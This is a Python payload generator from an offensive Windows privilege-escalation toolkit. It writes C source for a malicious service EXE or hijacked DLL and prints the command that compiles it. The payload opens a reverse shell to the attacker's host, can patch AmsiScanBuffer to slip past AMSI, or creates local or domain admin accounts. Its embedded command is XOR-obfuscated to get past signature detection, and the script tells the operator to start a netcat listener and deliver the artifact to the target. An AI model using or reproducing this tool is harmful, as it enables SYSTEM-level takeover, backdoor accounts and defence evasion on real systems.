#!/usr/bin/env python3
"""Payload factory for the SERVICE / DLL-HIJACK privesc paths.
Writes the C source and PRINTS the mingw compile command. Run on YOUR attacker box; the payload runs
{action} in the loader's context (SYSTEM for most services). Edit LHOST/LPORT in _winpriv_common.py.

Usage:
  python3 gen_payload.py exe [--action revshell|revshell_amsi|add_admin|add_admin_domain] [--arch x64|x86] [--name svc.exe]
  python3 gen_payload.py dll [--action ...] [--arch ...] --name hijacked.dll
Then compile with the printed line and deliver the artifact (see gen_service.py / gen_dll.py).
"""
import sys
import _winpriv_common as P

def die(m): print(m); sys.exit(1)

if len(sys.argv) < 2 or sys.argv[1] not in ("exe", "dll"):
    die("first arg must be 'exe' or 'dll'.  e.g. python3 gen_payload.py exe --action add_admin")

kind = sys.argv[1]
def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

action  = opt("--action", "revshell")
arch    = opt("--arch", "x64")
revtype = opt("--revtype", None)     # powershell|nc — nc survives Constrained Language Mode / no-PS
name    = opt("--name", "payload.exe" if kind == "exe" else "payload.dll")
if action not in P.win_actions(): die(f"unknown action '{action}'. pick: {', '.join(P.win_actions())}")

cmd = P.win_actions(revtype)[action]
src = name.rsplit(".", 1)[0] + ".c"
open(src, "w").write(P.payload_c(kind, cmd))

print(f"# wrote {src}  (kind={kind}  action={action}  arch={arch})")
notes = {
    "revshell":         f"# action=revshell -> TCP reverse shell to {P.LHOST}:{P.LPORT} in the loader's context. Start: nc -lvnp {P.LPORT}",
    "revshell_amsi":    f"# action=revshell_amsi -> same revshell, but the spawned powershell self-patches AmsiScanBuffer first. Start: nc -lvnp {P.LPORT}",
    "add_admin":        f"# action=add_admin -> creates LOCAL admin {P.ADMIN_USER}:{P.ADMIN_PASS}",
    "add_admin_domain": f"# action=add_admin_domain -> DOMAIN admin {P.ADMIN_USER} — only works if the loader is a DC / privileged domain acct",
}
print(notes[action])
print("# (embedded command is XOR-obfuscated in the PE — static-signature hygiene, NOT EDR-proof)")
print(f"\n# compile on the attacker (mingw; no target toolchain needed):")
print(P.win_compile(kind, src, name, arch))
print(f"\n# then deliver {name} to the target — see gen_service.py (unquoted/weak service) or gen_dll.py (search-order).")
